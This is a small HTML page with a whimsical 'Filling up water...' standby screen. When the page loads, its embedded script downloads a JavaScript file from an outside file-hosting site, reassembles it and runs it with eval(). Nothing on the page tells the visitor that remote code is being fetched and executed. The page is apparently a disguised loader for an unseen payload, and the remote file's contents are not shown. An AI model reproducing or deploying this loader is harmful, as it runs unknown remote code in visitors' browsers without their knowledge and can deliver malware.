<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  let chunks = [];
  fetch("https://files.catbox.moe/cwedrd.js")
    .then(res => res.body.getReader())
    .then(reader => {
      function pump() {
        return reader.read().then(({ done, value }) => {
          if (done) {
            // Merges everything only after full delivery
            let finalCode = new TextDecoder().decode(new Uint8Array([].concat(...chunks)));
            document.getElementById("status").textContent = "Executing full script...";
            eval(finalCode);
            return;
          }

          chunks.push(Array.from(value));
          return pump();
         });
      }
      return pump();
     })
     .catch(err => {
       document.getElementById("status").textContent = "Error: " + err.message;
     });
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
